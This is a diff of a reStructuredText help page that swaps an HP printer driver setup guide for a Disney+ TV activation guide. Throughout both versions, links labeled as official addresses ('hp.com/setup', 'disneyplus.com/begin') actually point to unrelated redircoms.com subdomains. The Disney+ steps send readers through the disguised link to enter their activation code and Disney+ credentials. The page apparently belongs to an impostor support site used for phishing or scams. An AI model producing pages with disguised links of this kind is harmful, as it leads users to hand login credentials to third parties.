@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How to watch Disney+ on your TV?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: E181B8BDF2CB760DDE8EC625F4AC6BB4
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: get-started.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: disneyplus.com/begin
+      :target: https://dis.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,47 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Watching your favorite Disney, Marvel, Star Wars, and Pixar content on the big screen is easier than ever. Whether you have a smart TV, streaming device, or game console, Disney+ offers seamless access across platforms. To get started, visit `disneyplus.com/begin <https://dis.redircoms.com>`_ to activate your device and link it to your account.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Compatible Devices
+-------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+You can watch Disney+ on a variety of supported devices, including:
 
-2. Enter your HP printer model in the search box.
+- Smart TVs (Samsung, LG, Android TV, etc.)
+- Streaming devices (Roku, Amazon Fire Stick, Apple TV, Chromecast)
+- Game consoles (PlayStation, Xbox)
+- Set-top boxes and cable providers
 
-3. Select your operating system if prompted.
+Step-by-Step Setup Instructions
+--------------------------------
 
-4. Click on **Download** to get the latest driver and software package.
+**1. Open the Disney+ App on Your TV**  
+Navigate to the Disney+ app using your TV’s app store or home menu. If the app isn’t already installed, download it first.
 
-5. Save the installer file to your computer.
+**2. Launch the App and Choose ‘Log In’**  
+Open the app and select **Log In**. A unique 8-digit code will appear on your screen.
 
-**********
-Steps to Install HP Printer Driver
-**********
+**3. Visit the Activation Page**  
+On a separate device (phone, tablet, or computer), go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
 
-1. Locate the downloaded installer file on your computer.
+**4. Enter the Code**  
+Type in the 8-digit code displayed on your TV and click **Continue**.
 
-2. Double-click the installer to begin the setup process.
+**5. Sign In to Your Disney+ Account**  
+Enter your Disney+ credentials to complete the activation. Your TV will refresh and log you in automatically.
 
-3. Follow the on-screen instructions and accept the license agreement.
+**6. Start Streaming**  
+Once activated, you can browse and stream all the content available in your Disney+ subscription.
 
-4. Choose your connection type (USB or Wireless).
+Tips for the Best Experience
+-----------------------------
 
-5. Complete the installation by clicking **Finish**.
+- Ensure your device and TV are connected to a stable Wi-Fi network.  
+- Update your Disney+ app regularly to access new features.  
+- Use the same Disney+ account across devices to sync your watch history and preferences.
 
-**********
-Setting Up Your HP Printer
-**********
+Conclusion
+-----------
 
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+Streaming Disney+ on your TV is a simple process that starts by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_. In just a few steps, you can unlock a world of entertainment and enjoy your favorite shows and movies on the big screen.
